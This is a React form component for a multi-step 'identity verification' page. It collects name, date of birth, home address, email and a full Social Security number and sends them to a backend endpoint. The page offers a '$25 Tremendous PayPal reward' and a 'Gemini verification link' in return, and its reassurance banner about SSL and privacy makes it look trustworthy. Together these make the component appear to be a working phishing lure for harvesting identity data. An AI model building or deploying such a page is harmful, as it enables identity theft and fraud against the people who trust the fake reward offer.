"use client";
import { useState } from "react";
import ProgressSteps from "./ProgressSteps";

export default function VerificationForm() {
  const states = [
    { code: "AL", name: "Alabama" },
    { code: "AK", name: "Alaska" },
    { code: "AZ", name: "Arizona" },
    { code: "AR", name: "Arkansas" },
    { code: "CA", name: "California" },
    { code: "CO", name: "Colorado" },
    { code: "CT", name: "Connecticut" },
    { code: "DE", name: "Delaware" },
    { code: "FL", name: "Florida" },
    { code: "GA", name: "Georgia" },
    { code: "HI", name: "Hawaii" },
    { code: "ID", name: "Idaho" },
    { code: "IL", name: "Illinois" },
    { code: "IN", name: "Indiana" },
    { code: "IA", name: "Iowa" },
    { code: "KS", name: "Kansas" },
    { code: "KY", name: "Kentucky" },
    { code: "LA", name: "Louisiana" },
    { code: "ME", name: "Maine" },
    { code: "MD", name: "Maryland" },
    { code: "MA", name: "Massachusetts" },
    { code: "MI", name: "Michigan" },
    { code: "MN", name: "Minnesota" },
    { code: "MS", name: "Mississippi" },
    { code: "MO", name: "Missouri" },
    { code: "MT", name: "Montana" },
    { code: "NE", name: "Nebraska" },
    { code: "NV", name: "Nevada" },
    { code: "NH", name: "New Hampshire" },
    { code: "NJ", name: "New Jersey" },
    { code: "NM", name: "New Mexico" },
    { code: "NY", name: "New York" },
    { code: "NC", name: "North Carolina" },
    { code: "ND", name: "North Dakota" },
    { code: "OH", name: "Ohio" },
    { code: "OK", name: "Oklahoma" },
    { code: "OR", name: "Oregon" },
    { code: "PA", name: "Pennsylvania" },
    { code: "RI", name: "Rhode Island" },
    { code: "SC", name: "South Carolina" },
    { code: "SD", name: "South Dakota" },
    { code: "TN", name: "Tennessee" },
    { code: "TX", name: "Texas" },
    { code: "UT", name: "Utah" },
    { code: "VT", name: "Vermont" },
    { code: "VA", name: "Virginia" },
    { code: "WA", name: "Washington" },
    { code: "WV", name: "West Virginia" },
    { code: "WI", name: "Wisconsin" },
    { code: "WY", name: "Wyoming" },
  ];

  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    dob: "",
    street: "",
    city: "",
    state: "",
    zip: "",
    email: "",
    ssn: "",
  });

  const nextStep = () => setStep(step + 1);
  const prevStep = () => setStep(step - 1);

  const handleSubmit = async (
    e: React.FormEvent<HTMLFormElement>
  ): Promise<void> => {
    e.preventDefault();
    if (
      formData.firstName == "" ||
      formData.lastName == "" ||
      formData.dob == "" ||
      formData.street == "" ||
      formData.city == "" ||
      formData.state == "" ||
      formData.zip == "" ||
      formData.email == "" ||
      formData.ssn == ""
    ) {
      return alert("Fill all the fields first !");
    }
    if (formData.ssn.length !== 9) {
      return alert("SSN should be 9 digit !");
    }
    // Save to DB
    try {
      const response = await fetch("/api/submit-verification", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        setStep(4);
      } else {
        throw new Error("Submission failed");
      }
    } catch (error) {
      console.error("Error submitting verification:", error);
      alert("Submission failed. Please try again.");
    }
  };

  const renderStep = () => {
    switch (step) {
      case 1:
        return (
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-gray-900">
              Personal Information
            </h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  First Name
                </label>
                <input
                  type="text"
                  value={formData.firstName}
                  onChange={(e) =>
                    setFormData({ ...formData, firstName: e.target.value })
                  }
                  className="w-full px-4 py-3 outline-0 text-gray-400 rounded-lg border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Last Name
                </label>
                <input
                  type="text"
                  value={formData.lastName}
                  onChange={(e) =>
                    setFormData({ ...formData, lastName: e.target.value })
                  }
                  className="w-full px-4 py-3 outline-0 text-gray-400 rounded-lg border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
                />
              </div>
            </div>
            <div className="mt-6">
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Date of Birth
              </label>
              <input
                type="date"
                value={formData.dob}
                onChange={(e) =>
                  setFormData({ ...formData, dob: e.target.value })
                }
                className="w-full px-4 py-3 outline-0 text-gray-400 rounded-lg border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
              />
            </div>
            <div className="flex justify-end mt-8">
              <button
                onClick={nextStep}
                className="px-6 py-3 bg-gradient-to-r from-blue-500 to-purple-600 text-white font-medium rounded-lg hover:from-blue-600 hover:to-purple-700 transition-all shadow-lg"
              >
                Continue
              </button>
            </div>
          </div>
        );
      case 2:
        return (
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-gray-900">
              Address Information
            </h2>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Street Address
              </label>
              <input
                type="text"
                value={formData.street}
                onChange={(e) =>
                  setFormData({ ...formData, street: e.target.value })
                }
                className="w-full px-4 py-3 outline-0 text-gray-400 rounded-lg border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
              />
            </div>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  City
                </label>
                <input
                  type="text"
                  value={formData.city}
                  onChange={(e) =>
                    setFormData({ ...formData, city: e.target.value })
                  }
                  className="w-full px-4 py-3 outline-0 text-gray-400 rounded-lg border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Zip Code
                </label>
                <input
                  type="text"
                  value={formData.zip}
                  onChange={(e) =>
                    setFormData({ ...formData, zip: e.target.value })
                  }
                  className="w-full px-4 py-3 outline-0 text-gray-400 rounded-lg border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  State
                </label>
                <select
                  value={formData.state}
                  onChange={(e) =>
                    setFormData({ ...formData, state: e.target.value })
                  }
                  className="w-full px-4 py-3 outline-0 text-gray-400 rounded-lg border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
                >
                  <option value="">Select State</option>
                  {states.map((state) => (
                    <option key={state.code} value={state.code}>
                      {state.name}
                    </option>
                  ))}
                </select>
              </div>
            </div>
            <div className="flex justify-between mt-8">
              <button
                onClick={prevStep}
                className="px-6 py-3 border border-gray-300 text-gray-700 font-medium rounded-lg hover:bg-gray-50 transition-all"
              >
                Back
              </button>
              <button
                onClick={nextStep}
                className="px-6 py-3 bg-gradient-to-r from-blue-500 to-purple-600 text-white font-medium rounded-lg hover:from-blue-600 hover:to-purple-700 transition-all shadow-lg"
              >
                Continue
              </button>
            </div>
          </div>
        );
      case 3:
        return (
          <form onSubmit={handleSubmit} className="space-y-6">
            <h2 className="text-2xl font-bold text-gray-900">
              Security Verification
            </h2>
            <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4">
              <div className="flex">
                <div className="ml-3">
                  <p className="text-sm text-yellow-700">
                    Your information is secured with SSL encryption. We will
                    never share your private details.
                  </p>
                </div>
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Email
              </label>
              <input
                type="email"
                value={formData.email}
                onChange={(e) =>
                  setFormData({ ...formData, email: e.target.value })
                }
                className="w-full px-4 py-3 mb-2 outline-0 text-gray-400 rounded-lg border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
              />
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Social Security Number
              </label>
              <input
                placeholder="xxx-xx-xxxx"
                type="text"
                value={formData.ssn}
                onChange={(e) =>
                  setFormData({ ...formData, ssn: e.target.value })
                }
                className="w-full px-4 py-3 outline-0 text-gray-400 rounded-lg border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
              />
            </div>
            <div className="flex justify-between mt-8">
              <button
                type="button"
                onClick={prevStep}
                className="px-6 py-3 border border-gray-300 text-gray-700 font-medium rounded-lg hover:bg-gray-50 transition-all"
              >
                Back
              </button>
              <button
                type="submit"
                className="px-6 py-3 bg-gradient-to-r from-blue-500 to-purple-600 text-white font-medium rounded-lg hover:from-blue-600 hover:to-purple-700 transition-all shadow-lg"
              >
                Complete Verification
              </button>
            </div>
          </form>
        );
      case 4:
        return (
          <div className="space-y-6">
            <div className="text-center px-16">
              <div className="mx-auto flex items-center justify-center h-16 w-16 rounded-full bg-green-100 mb-4">
                <svg
                  className="h-8 w-8 text-green-600"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M5 13l4 4L19 7"
                  />
                </svg>
              </div>
              <h2 className="text-2xl font-bold text-gray-900">
                Thank you for your submission!
              </h2>
              <p className="text-gray-600 mt-2">
                Your information has been submitted successfully. Your Gemini
                verification link will be sent to your email shortly. Please
                check your inbox as well as your spam or junk folder.
              </p>
            </div>

            <div className="bg-purple-50 rounded-lg p-6 text-center">
              <p className="text-purple-800 font-medium">
                Once your identity is verified, you will receive the{" "}
                <span className="font-bold">
                  $25 Tremendous PayPal reward link
                </span>
                !
              </p>
            </div>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="bg-white rounded-2xl shadow-xl overflow-hidden p-8">
      <ProgressSteps currentStep={step} />
      {renderStep()}
    </div>
  );
}
